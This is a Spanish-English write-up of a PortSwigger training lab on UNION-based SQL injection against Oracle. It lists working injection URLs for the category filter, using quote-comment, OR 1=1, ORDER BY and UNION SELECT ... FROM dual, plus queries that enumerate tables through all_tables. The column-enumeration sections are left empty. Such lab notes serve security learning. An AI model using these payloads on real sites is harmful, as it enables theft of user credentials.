# `LAB`: SQL injection attack, listing the database contents on Oracle

## Descripción:

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user. 

## Hint

On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual` 

### Oracle Cheastsheet:

- [PortSwigger - SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


---

### Explicación:

- Muy similar a los laboratorios anteriores enfocados a `Oracle`
- En este caso es llegar hasta el login con `adminsitrador`
- Es un poco diferente a MySQL el dump de información de Oracle, así que pondré el proceso completo:

---

### Explicación para enumerar `DB Info`, `Tablas`, `Columnas` y `Data` Oracle

**`DB Info`:** Enumerar en Oracle Base de Datos, versión, etc:

````sql
# Banner:
SELECT banner FROM v$version
# Version:
SELECT version FROM v$instance
````

**`Tablas`:** En Oracle se pone originalmente para mostrar todas las tables:

````sql
# Enumerar nombres de tablas:
SELECT table_name FROM all_tables;
````

Para seleccionar solo la base de datos que estamos usando en Oracle es más fácil utilizar los usarios que utilizan la DB _(en este caso el más obvio de un user no default era "Peter")_:

````sql
# Enumerar propietarios de tablas:
SELECT table_name FROM all_tables WHERE owner = 'PETER';
````

**`Columnas`:** En Oracle se pone originalmente para mostrar las columnas




## Solución:

````py
# Vulnerabilidad y sanamiento
.web-security-academy.net/filter?category=Pets' -- -

# Mostrar info oculta (opcional)
.web-security-academy.net/filter?category=Pets' or 1 = 1 -- -

# Fuzzing Número de Columnas
.web-security-academy.net/filter?category=Pets' order by 2 -- -

## Columnas vulnerables: Como es caso de Oracle NO SIRVE el siguiente query:
.web-security-academy.net/filter?category=-Pets' Union Select '1','2' -- -

## Columnas vulnerables: Este es el que se debe utilizar, con la default table "dual":
.web-security-academy.net/filter?category=-Pets' Union Select '1','2' FROM dual -- -

    ### Enumer Tablas:

# TODAS: Utilizar sintaxis Oracle para enumerar Tablas:
.web-security-academy.net/filter?category=-Pets' Union Select '1',table_name FROM all_tables -- -
# Filtrando por User: A diferencia de MySQL es mejor enumerar tablas por propietario:
.web-security-academy.net/filter?category=-Pets' Union Select '1',table_name FROM all_tables WHERE owner = 'PETER' -- -
        ## PRODUCTS
        ## USERS_GZGVRP

    ### Enumer Columnas:





````
